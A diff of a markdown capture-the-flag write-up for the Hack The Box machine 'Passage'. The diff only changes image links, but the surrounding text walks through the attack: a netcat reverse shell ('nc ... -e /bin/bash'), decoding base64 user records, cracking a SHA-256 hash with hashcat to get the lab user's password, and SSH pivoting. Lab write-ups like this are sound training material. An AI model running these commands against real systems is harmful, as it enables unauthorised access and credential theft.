@@ -56,7 +56,7 @@ The author of the box says that the intended route is with metasploit.
 
 In either case you get a shell as www-data, we can't get the flag just yet. We have to escalate privileges to get the user flag. 
 
-![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/PassageHTB/cutenews.png)
+![](/assets/images/PassageHTB/cutenews.png)
 
 First order of business was making this a reverse shell cause I can't stand that default shell.
 I ran nc -lnvp 9827 on my host kali machine and nc 10.10.**.** 9827 -e /bin/bash on the passage box
@@ -82,21 +82,21 @@ END OF PRO TIP
 
 At this point I got lost, that was until until I dig deeper and found /var/www/html/CuteNews/cdata.
 In this directory I fell into a rabbithole of writing a python script to base64 decode the hashes inside of these many files
-![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/PassageHTB/base64.png)
+![](/assets/images/PassageHTB/base64.png)
 
 For example, inside of one of those php files 
-![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/PassageHTB/1stphp.png)
+![](/assets/images/PassageHTB/1stphp.png)
 has the first line as garbage and the second line being a base64 string. 
 This script turned out to be for naught as the actual way to escalate privileges can be found inside the **Lines** file. 
-![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/PassageHTB/lines.png)
+![](/assets/images/PassageHTB/lines.png)
 if you go through and decode them you come across one that says paul@passage.htb which is one of the two users I found when I was enumerating the home directory
-![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/PassageHTB/homedir.png)
+![](/assets/images/PassageHTB/homedir.png)
 
 Then we throw that hash we found into a hash analyzer and realize it's sha-256, well we could give it a shot cracking that hash to get his password.
-![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/PassageHTB/analyzer.png)
+![](/assets/images/PassageHTB/analyzer.png)
 
 We could easily enough crack it with hashcat but this online service did it in less than a second.
-![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/PassageHTB/hashcrack.png)
+![](/assets/images/PassageHTB/hashcrack.png)
 If you want to take a more manual approach with hashcat yourself you could do it with 
 ```
 hashcat -m 1400 paul.txt /usr/share/wordlists/rockyou.txt
@@ -104,7 +104,7 @@ hashcat -m 1400 paul.txt /usr/share/wordlists/rockyou.txt
 at any rate you get atlanta1 as the password for paul
 I enumerated as paul for a while until I eventually went into the .ssh dir and cated it all out,
 I saw that nadav was in the authorized keys so while logged into paul I SSHd into nadav. 
-![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/PassageHTB/sshNadav.png)
+![](/assets/images/PassageHTB/sshNadav.png)
 
 Now out of all the privilege escalation i did for this box going from nadav to root was by far the hardest.
 I always start out running a script that gives me a quick overview of the entire box very easily in case there's something i can spot out of place. In this case it didn't help all too much and I was left to exploring on my own
